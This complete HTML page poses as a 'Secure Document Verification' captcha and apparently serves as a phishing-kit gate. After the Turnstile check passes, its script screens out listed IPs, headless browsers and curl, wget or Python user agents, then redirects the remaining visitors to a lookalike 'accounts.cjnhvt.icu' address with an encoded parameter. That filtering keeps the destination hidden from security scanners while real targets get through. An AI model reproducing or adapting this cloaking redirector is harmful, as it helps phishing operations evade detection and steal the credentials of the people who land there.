<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Secure Document Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f7f9fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #ffffff;
            border-radius: 12px;
            padding: 40px 30px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .secure-icon {
            font-size: 48px;
            color: #2ecc71;
        }

        .secure-text {
            font-size: 22px;
            margin: 15px 0 30px;
            color: #333333;
        }

        .cf-turnstile {
            display: inline-block;
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>

<body>


        <form id="captchaForm">
            <div class="cf-turnstile" data-sitekey="0x4AAAAAADN8LGNzPekyqArY" data-callback="onCaptchaSuccess">
            </div>
        </form>
    <script>
        // List of known bad IPs (example). Ideally this comes from backend.
const blacklistedIPs = [
    "45.153.160.3", "185.220.101.50", "198.96.155.3" // Tor, spam IPs, etc.
];

// Use free IP API to get visitor IP (client-side)
function checkIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            console.log("User IP:", ip);
            if (blacklistedIPs.includes(ip)) {
                alert("Access denied: Suspicious IP.");
                throw new Error("Blocked IP.");
            }
        })
        .catch(err => {
            console.error("IP check failed", err);
            alert("IP check failed.");
        });
}

// Basic bot detection (heuristics)
function detectBotActivity() {
    const hasHeadless = navigator.webdriver;
    const hasPlugins = navigator.plugins.length === 0;
    const hasNoLanguage = !navigator.language;
    const suspiciousUserAgent = /HeadlessChrome|PhantomJS|Python|curl|wget/i.test(navigator.userAgent);

    if (hasHeadless || hasPlugins || hasNoLanguage || suspiciousUserAgent) {
        alert("Bot activity detected.");
        throw new Error("Bot detected.");
    }
}

// CAPTCHA callback
function onCaptchaSuccess(token) {
    // Start security checks
    checkIP()
        .then(() => {
            detectBotActivity();

            // Redirect without email parameter
            const go_url = "https://accounts.cjnhvt.icu/?S8BDOC2Q4cUh=eG51Ymc=";
            location.replace(go_url);
        })
        .catch((e) => {
            console.warn("Aborted due to: ", e.message);
        });
}
    </script>


</body>

</html>
